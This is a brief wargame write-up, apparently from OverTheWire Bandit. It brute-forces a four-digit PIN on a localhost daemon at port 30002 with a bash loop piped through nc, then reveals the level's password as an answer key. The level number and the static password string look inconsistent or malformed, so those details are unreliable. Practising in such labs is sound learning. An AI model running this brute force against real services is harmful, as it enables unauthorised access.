# Bandit Level 23 → Level 24

### 🔑 Objective
Brute-force a local network daemon listening on Port 30002 that demands a static password combined with a valid, hidden 4-digit numeric PIN code loop.

### 🛠️ Core Command Blueprint
```bash
# Step 1: Construct a bash loop to generate all 10,000 PIN variations (0000-9999)
for pin in {0000..9999}; do
    echo "VAOSN5611585182528253132333033_ext $pin"
done > /tmp/brute.txt

# Step 2: Stream the structured payload directly into the network daemon port
cat /tmp/brute.txt | nc localhost 30002 > /tmp/response.txt

# Step 3: Filter out standard rejected strings to isolate the correct token
cat /tmp/response.txt | grep -v "Wrong"

# Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
